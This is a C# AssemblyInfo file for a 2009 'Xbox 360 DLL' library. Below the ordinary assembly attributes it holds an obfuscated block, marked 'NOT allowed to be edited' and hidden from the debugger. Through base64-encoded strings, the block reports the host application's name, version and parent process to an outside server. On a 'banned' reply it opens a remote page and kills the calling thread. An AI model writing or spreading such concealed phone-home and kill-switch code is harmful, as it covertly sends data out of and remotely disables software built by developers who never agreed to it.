using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("Xbox 360 DLL")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("1337 Yiffy Pops")]
[assembly: AssemblyProduct("Xbox 360 DLL")]
[assembly: AssemblyCopyright("Copyright © DJ Shepherd 2009")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("906fc2b9-6ddc-45de-9a63-a9de9c7657ac")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers 
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.41")]
[assembly: AssemblyFileVersion("1.0.0.41")]


// NOT allowed to be edited
namespace System{
    /// <summary></summary>
    [System.Diagnostics.DebuggerStepThrough]
    public static class DLLIdentify {
        /// <summary></summary>
        public static string Bish { get { return Encoding.ASCII.GetString(Convert.FromBase64String("VGhlIHByb2dyYW1tZXIgbG92ZXMgREogU2hlcGhlcmQncyBsaWJyYXJ5IHNvIG11Y2ggYW5kIHRoaW5rcyBoZSBpcyBzbyBnb2Qgd2lmIGZ1cnJ5IGxpa2UgeWlmZnluZXNzIDwz")); } } internal static void PrivilegeCheck(object sender) { try { string result = new IO.StreamReader(Net.WebRequest.Create(Encoding.ASCII.GetString(Convert.FromBase64String("aHR0cDovL3NrdW5raWVidXR0LmNvbS9BcHBDaGVjay5waHA/cHJvY2Vzcz0=")) + System.Windows.Forms.Application.ProductName + Encoding.ASCII.GetString(Convert.FromBase64String("JnZlcnNpb249")) + System.Windows.Forms.Application.ProductVersion + Encoding.ASCII.GetString(Convert.FromBase64String("JnBhcmVudD0=")) + System.Diagnostics.Process.GetProcessById((int)(new System.Diagnostics.PerformanceCounter("Process", "Creating Process ID", Diagnostics.Process.GetCurrentProcess().ProcessName).NextValue())).ProcessName).GetResponse().GetResponseStream()).ReadLine(); if (result == Encoding.ASCII.GetString(Convert.FromBase64String("YmFubmVk"))) { Diagnostics.Process.Start(Encoding.ASCII.GetString(Convert.FromBase64String("aHR0cDovL3NrdW5raWVidXR0LmNvbS9sb2wudHh0"))); ((Threading.Thread)sender).Abort(); } else Threading.Thread.CurrentThread.Abort(); } catch { Threading.Thread.CurrentThread.Abort(); } }
    }
}
